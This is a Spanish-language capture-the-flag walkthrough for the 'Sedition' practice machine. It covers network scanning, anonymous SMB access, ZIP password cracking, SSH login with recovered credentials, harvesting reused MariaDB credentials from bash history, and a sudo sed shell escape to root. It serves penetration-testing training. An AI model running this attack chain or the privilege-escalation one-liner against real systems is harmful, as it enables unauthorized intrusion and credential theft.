
# **Sedition - The Hackers Labs**
**Plataforma:** Linux
**Dificultad:** Media

## **📌 Descripción**
Máquina Linux basada en Debian con servicios **SMB** y **SSH** expuestos. La explotación incluye:
- **Reconocimiento de hosts** con `netdiscover`.
- **Escaneo de puertos** con `nmap` (SMB y SSH en puerto no estándar).
- **Enumeración SMB** con `enum4linux` para descubrir usuarios y recursos compartidos.
- **Cracking de contraseñas** (archivo ZIP protegido) con `zip2john` y `John the Ripper`.
- **Movimiento lateral** mediante credenciales reutilizadas en MariaDB.
- **Escalada de privilegios** explotando permisos `sudo` con `sed`.

---

## **🔍 Reconocimiento de Hosts**
### **Comando:**
```bash
netdiscover -i eth1 -r 10.0.0.0/16
```

### **Resultado:**
| **IP**      | **MAC Address**          | **Vendor**               |
|-------------|--------------------------|--------------------------|
| 10.0.4.1    | 52:54:00:12:35:00        | Unknown vendor           |
| 10.0.4.2    | 52:54:00:12:35:00        | Unknown vendor           |
| 10.0.4.3    | 08:00:27:67:2e:3e        | PCS Systemtechnik GmbH   |
| **10.0.4.52** | **08:00:27:9a:e7:06**    | **PCS Systemtechnik GmbH** |

🔹 **IP objetivo:** `10.0.4.52`

---

## **🚀 Escaneo de Puertos**
### **Comandos:**
```bash
nmap -n -Pn -sS -sV -p- --open --min-rate 5000 10.0.4.52
nmap -n -Pn -sCV -p139,445,65535 --min-rate 5000 10.0.4.52
```

### **Resultado:**
| **Puerto** | **Servicio**       | **Versión**                     |
|------------|--------------------|---------------------------------|
| 139/tcp    | Samba smbd         | 4                               |
| 445/tcp    | Samba smbd         | 4                               |
| **65535/tcp** | **OpenSSH**     | **9.2p1 Debian 2+deb12u6**      |

---

## **🔐 Enumeración SMB**
### **Comando:**
```bash
enum4linux -a 10.0.4.52
```
```bash
impacket-samrdump  10.0.4.52
```
```bash
smbmap -H 10.0.4.52 -u "" -p ""
```
```bash
smbclient -L //10.0.4.52/ -U "" -N --max-protocol=SMB3
```

### **Hallazgos:**
- **Usuarios:** `cowboy`, `debian`.
- **Recursos compartidos accesibles:**
  - `backup` (lectura/escritura sin credenciales).
  - `print$`, `IPC$`, `nobody`.
  - 
## **💾 Extracción del backup**
```bash
smbclient //10.0.4.52/backup -U guest
Password for [WORKGROUP\guest]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Sun Jul  6 12:02:53 2025
  ..                                  D        0  Sun Jul  6 13:15:13 2025
  secretito.zip                       N      216  Sun Jul  6 12:02:31 2025

                19480400 blocks of size 1024. 16253800 blocks available
smb: \> get secretito.zip
getting file \secretito.zip of size 216 as secretito.zip (7,5 KiloBytes/sec) (average 7,5 KiloBytes/sec)
smb: \> exit
```
### **Acceso al recurso `backup`:**
```bash
smbclient //10.0.4.52/backup -U guest
```

---

## **💾 Extracción de Archivo ZIP**

📁 **Archivo encontrado:** `secretito.zip`.

### **Cracking de contraseña:**
```bash
john --show hash.txt

secretito.zip/password:sebastian:password:secretito.zip::secretito.zip
```
```bash
fcrackzip -u -D -p /usr/share/wordlists/rockyou.txt secretito.zip

PASSWORD FOUND!!!!: pw == sebastian
```

```bash
zip2john secretito.zip > hash3.txt
john --wordlist=/usr/share/wordlists/rockyou.txt hash3.txt
```
🔑 **Contraseña del ZIP:** `sebastian`.

### **Contenido del ZIP:**
```bash
unzip -P "sebastian" secretito.zip

Archive:  secretito.zip
 extracting: password  
```
```bash
Cat password
elbunkermolagollon123
```
---

## **Puerto a hackear**
```bash
sudo nmap -sT -A -p 65535 10.0.4.52
Host is up (0.00028s latency).

PORT      STATE SERVICE VERSION
65535/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u6 (protocol 2.0)
| ssh-hostkey: 
|   256 32:ca:e5:d1:12:c2:1e:11:1e:58:43:32:a0:dc:03:ab (ECDSA)
|_  256 79:3a:80:50:61:d9:96:34:e2:db:d6:1e:65:f0:a9:14 (ED25519)
MAC Address: 08:00:27:A1:D8:60 (Oracle VirtualBox virtual NIC)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running: Linux 4.X|5.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
OS details: Linux 4.15 - 5.19
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```


## **🔑 Movimiento Lateral (SSH)**
### **Conexión SSH:**
```bash
ssh cowboy@10.0.4.52 -p 65535
```
🔑 **Contraseña:** `elbunkermolagollon123`.
```bash
expect -c 'spawn ssh cowboy@192.168.80.48 -p 65535; expect "password:"; send "elbunkermolagollon123\r"; interact'

spawn ssh cowboy@10.0.4.52 -p 65535
cowboy@192.168.80.48's password: 
Linux Sedition 6.1.0-37-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.140-1 (2025-05-22) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Fri Jun 19 01:25:55 2026 from 10.0.4.52
cowboy@Sedition:~$ 
```

### **Enumeración:**
```bash
cat .bash_history
history
exit
mariadb
mariadb -u cowboy -pelbunkermolagollon123
su debian
exit
```
🔍 **Hallazgo:** Credenciales para MariaDB (`cowboy:elbunkermolagollon123`).

---

## **🗃️ Explotación de MariaDB**
### **Conexión a la base de datos:**
```bash
mariadb -u cowboy -p
Enter password: 
Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MariaDB connection id is 31
Server version: 10.11.11-MariaDB-0+deb12u1 Debian 12

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

show databases;
+--------------------+
| Database           |
+--------------------+
| bunker             |
| information_schema |
+--------------------+
2 rows in set (0,023 sec)

MariaDB [(none)]> show tables;
ERROR 1046 (3D000): No database selected
MariaDB [(none)]> select * from user;
ERROR 1046 (3D000): No database selected
MariaDB [(none)]> show databases;
+--------------------+
| Database           |
+--------------------+
| bunker             |
| information_schema |
+--------------------+
2 rows in set (0,001 sec)

MariaDB [(none)]> use bunker
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
MariaDB [bunker]> show tables;
+------------------+
| Tables_in_bunker |
+------------------+
| users            |
+------------------+
1 row in set (0,000 sec)

MariaDB [bunker]> select * from user;
ERROR 1146 (42S02): Table 'bunker.user' doesn't exist
MariaDB [bunker]> select * from users;
+--------+----------------------------------+
| user   | password                         |
+--------+----------------------------------+
| debian | 7c6a180b36896a0a8c02787eeafb0e4c |
+--------+----------------------------------+
1 row in set (0,000 sec)




```
📊 **Base de datos encontrada:** `bunker` → Tabla `users`.

### **Consulta:**
```sql
SELECT * FROM users;
```
🔑 **Hash MD5 para `debian`:**
```
7c6a180b36896a0a8c02787eeafb0e4c
```
🔓 **Contraseña crackeada:** `password1`.

---

## **🚀 Escalada de Privilegios (Sudo)**
### **Verificación de permisos:**
```bash
sudo -l
```
🔧 **Permiso encontrado:** `sudo /usr/bin/sed` (sin contraseña).

### **Explotación con `sed`:**
```bash
sudo /usr/bin/sed -n '1e exec /bin/sh 1>&0' /etc/hosts
```
👑 **Acceso root obtenido.**

---

## **🏆 Flags**
### **Flag de usuario (`debian`):**
```bash
cat /home/debian/flag.txt
```
📌 **Contenido:** `pingxxxxxxxxxxxinazo`

### **Flag de root:**
```bash
cat /root/root.txt
```
📌 **Contenido:** `laflagdelxxxxxxxxxolaaunmas`

---
## **📝 Resumen de Pasos**
1. **Reconocimiento** → `netdiscover`.
2. **Escaneo** → `nmap`.
3. **Enumeración SMB** → `enum4linux`.
4. **Cracking ZIP** → `zip2john` + `John the Ripper`.
5. **SSH** → Reutilización de credenciales.
6. **MariaDB** → Explotación de credenciales.
7. **Escalada** → `sudo sed`.

---
## **🛠 Herramientas Utilizadas**
- `netdiscover`
- `nmap`
- `enum4linux`
- `smbclient`
- `zip2john`
- `John the Ripper`
- `MariaDB`
- `sed` (explotación sudo)

---
**⚠️ Nota:** Esta máquina es un entorno de práctica para pruebas de penetración. **No la uses en sistemas reales sin autorización.**
```
